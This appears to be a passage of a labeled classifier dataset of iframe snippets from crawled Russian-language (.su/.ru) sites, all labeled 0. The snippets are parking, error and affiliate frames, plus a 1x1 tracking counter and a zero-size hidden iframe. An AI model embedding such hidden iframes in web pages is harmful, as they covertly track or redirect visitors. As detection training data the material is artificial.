0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://perfomans.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4925_20170729_020853/html_200_20170729_020853.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7438_20170729_060931/html_200_20170729_060931.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?emirate.su""></iframe>",http://emirate.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8786_20170729_022227/html_200_20170729_022227.txt
0,"<iframe frameborder=""0"" height=""1"" scrolling=""no"" src=""http://crm.masterlead.ru/api/counter/1349/?api_key=54c67e&amp;channel=0&amp;subid=&amp;prx=&amp;key_phrase="" width=""1""></iframe>",http://yurist-online.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2468_20170729_050252/html_200_20170729_050252.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://ckc.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8353_20170729_122721/html_200_20170729_122721.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=diman.su&amp;pid=9PO755G95""></iframe>",http://diman.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4159_20170729_124651/html_200_20170729_124651.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7967_20170729_093226/html_200_20170729_093226.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://amuragro.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3914_20170729_073059/html_200_20170729_073059.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/locked/"" width=""100%""></iframe>",http://tyga.su/cgi-sys/suspendedpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1979_20170729_072141/html_200_20170729_072141.txt
0,"<iframe border=""0"" height=""100%"" src=""http://superdiski.info/beztabletok/VIG2014"" width=""100%""></iframe>",http://yourhealer.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5525_20170729_024103/html_200_20170729_024103.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9279_20170729_005851/html_200_20170729_005851.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9808_20170729_122132/html_200_20170729_122132.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://mediaexpert.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2964_20170729_073108/html_200_20170729_073108.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1378_20170729_071853/html_200_20170729_071853.txt
0,"<iframe frameborder=""0"" height=""0"" src=""http://anisimov-mikhail.ru/"" width=""0""></iframe>",http://orexi.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3076_20170729_055357/html_200_20170729_055357.txt